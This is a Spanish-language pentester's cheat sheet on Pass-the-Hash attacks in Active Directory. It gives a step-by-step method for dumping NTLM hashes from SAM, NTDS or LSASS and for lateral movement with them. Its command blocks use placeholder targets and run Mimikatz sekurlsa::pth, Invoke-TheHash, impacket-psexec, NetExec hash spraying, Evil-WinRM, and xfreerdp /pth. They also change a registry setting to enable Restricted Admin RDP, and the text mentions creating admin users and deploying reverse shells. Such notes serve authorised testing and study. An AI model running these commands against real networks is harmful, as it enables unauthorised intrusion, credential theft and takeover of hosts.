---
tags:
  - pth
  - AD
---
## Conceptos Clave (TL;DR)

* Un ataque Pass the Hash (PtH) utiliza el hash de la contraseña (NTLM o RC4) del usuario para autenticarse en un sistema sin necesidad de descifrar la contraseña en texto claro.

* Explota la naturaleza del protocolo de autenticación (como NTLM), el cual funciona mediante un desafío-respuesta donde las contraseñas almacenadas no usan "salt" y el hash permanece estático.

* Para obtener los hashes iniciales, el atacante ya debe poseer privilegios administrativos o especiales en la máquina comprometida.

* Los hashes suelen extraerse volcando la base de datos SAM local, extrayendo la base de datos NTDS (ntds.dit) en Controladores de Dominio, o directamente de la memoria a través de lsass.exe.
  

## Herramientas Clave

* **Mimikatz (Windows):** Ejecuta procesos en el contexto de otro usuario inyectando su hash en memoria mediante el módulo `sekurlsa::pth`.

* **Invoke-TheHash (Windows):** Colección de scripts en PowerShell para realizar PtH a través de SMB y WMI usando TCPClient de .NET, sin requerir privilegios de administrador en la máquina origen.

* **Impacket (Linux):** Suite que incluye herramientas como `psexec`, `wmiexec`, `atexec` y `smbexec` para ejecución de comandos remotos mediante hashes.

* **[NetExec](../../../📂%2008%20Herramientas&Cheatsheets/NetExec.md) (Linux):** Automatiza la evaluación en redes de Active Directory. Ideal para "Password Spraying", verificar reutilización de hashes de administrador local y ejecución masiva.

* **Evil-WinRM (Linux):** Permite autenticación PtH a través de PowerShell remoting. Es la alternativa principal cuando SMB está bloqueado.

* **xfreerdp (Linux):** Utilizado para obtener acceso gráfico (GUI) mediante RDP usando un hash en lugar de una contraseña.
  

## Metodología Paso a Paso

1. **Extracción de Credenciales:** Obtener el hash NTLM volcando el SAM, NTDS o LSASS desde un equipo previamente comprometido.

2. **Validación de Accesos:** Utilizar herramientas como NetExec para verificar en qué equipos de la red el hash obtenido tiene privilegios administrativos (buscando el indicador "Pwn3d!").

3. **Ejecución de Comandos / Movimiento Lateral:** Con el hash validado, utilizar SMB (Impacket/Invoke-TheHash), WMI o WinRM para ejecutar comandos remotos, crear usuarios o desplegar Reverse Shells en los sistemas objetivo.

4. **Acceso Gráfico (Opcional):** Si se requiere interacción con el escritorio, configurar el modo de administrador restringido en el objetivo y acceder por RDP con el hash.
  

## Cheat Sheet de Comandos

*La ejecución de comandos y herramientas depende del sistema operativo origen y del protocolo abierto en el objetivo.*
### Windows - Mimikatz
*Se requiere ejecutar Mimikatz como administrador. El parámetro `/run` lanza el proceso deseado (por defecto cmd.exe si se omite).*
  
```cmd
# Escala privilegios locales y ejecuta un CMD bajo el contexto del usuario usando su hash NTLM/RC4.

# Para cuentas locales, en /domain usar localhost o un punto (.)

mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

### Windows - Invoke-TheHash
*Permite ejecución vía SMB o WMI. Si se usa una cuenta local, el parámetro `-Domain` no es necesario o se puede agregar `@domain` al final del `-Username`.*

```powershell
# Importar el módulo en la sesión de PowerShell

Import-Module .\Invoke-TheHash.psd1
```
  
```powershell
# Ejecutar un comando vía SMB (Ej. crear un usuario y agregarlo a administradores locales)
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USER> -Hash <HASH> -Command "<COMMAND>" -Verbose
```
  
```powershell
# Ejecutar un comando vía WMI (Ej. ejecutar un payload base64 para Reverse Shell)
Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USER> -Hash <HASH> -Command "<COMMAND>"
```

### Linux - Impacket
*Uso del script de PsExec modificado para PtH. (Aplica igual para wmiexec, smbexec, atexec ).*

```bash
# Ejecutar una shell interactiva en el objetivo vía SMB usando psexec. Note los dos puntos (:) antes del hash.

impacket-psexec <USER>@<TARGET_IP> -hashes :<HASH>
```

### Linux - NetExec
*Herramienta principal para enumerar y validar accesos masivos.*

```bash
# Verificar acceso de un usuario de dominio en un rango de red (Password Spraying)

netexec smb <TARGET_NETWORK> -u <USER> -d <DOMAIN> -H <HASH>
```
  
```bash
# Verificar reutilización de la contraseña del Administrador LOCAL en la subred

netexec smb <TARGET_NETWORK> -u <USER> --local-auth -H <HASH>
```
  
```bash
# Ejecutar un comando específico (-x) en un objetivo donde somos administradores (Pwn3d!)

netexec smb <TARGET_IP> -u <USER> -d <DOMAIN> -H <HASH> -x "<COMMAND>"
```

### Linux - Evil-WinRM
*Requiere el formato de nombre de dominio completo para cuentas de dominio.*

```bash
# Iniciar una sesión interactiva de PowerShell Remoting mediante el hash

evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>
```

### Acceso RDP - xfreerdp
*Si se cuenta con ejecución de comandos previa, habilitar "Restricted Admin Mode" antes de conectar.*

```cmd
# (Ejecutar en el objetivo vía cmd) Habilitar Modo de Administrador Restringido para RDP

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
# (Ejecutar en el atacante) Conexión RDP usando el hash en lugar de la contraseña

xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH>
```


## "Gotchas" y Troubleshooting

* **Restricciones de UAC en Cuentas Locales:** El Control de Cuentas de Usuario (UAC) bloquea PtH para administradores locales a menos que sean la cuenta integrada "Administrator" (RID-500). Si el registro `LocalAccountTokenFilterPolicy` está en `0`, PtH fallará para administradores locales distintos al RID-500. Si se cambia a `1`, se permite para todos los administradores locales.

* **El caso del RID-500 y UAC:** Si la clave de registro `FilterAdministratorToken` está habilitada (valor `1`), incluso la cuenta RID-500 cae bajo la protección del UAC y los ataques PtH remotos fallarán.

* **Cuentas de Dominio y UAC:** Estas restricciones de UAC solo aplican a cuentas locales. Si el hash pertenece a una cuenta de dominio con privilegios administrativos en el equipo, PtH funcionará sin problemas de UAC.

* **Errores en RDP (Modo Restringido):** Un error de "Account restrictions prevent signing in..." al intentar RDP PtH indica que "Restricted Admin Mode" no está habilitado en el objetivo.

* **Políticas de Bloqueo (Account Lockout):** Al usar NetExec para "Password Spraying", ten cuidado con la política de bloqueo de cuentas del dominio. Para probar credenciales locales de forma segura sin bloquear cuentas de dominio, usa el flag `--local-auth` para que intente una sola vez en cada host.

* **Reutilización de Contraseñas (LAPS):** En entornos maduros con LAPS implementado, las contraseñas de administrador local se aleatorizan, invalidando el movimiento lateral masivo con el hash de un administrador local.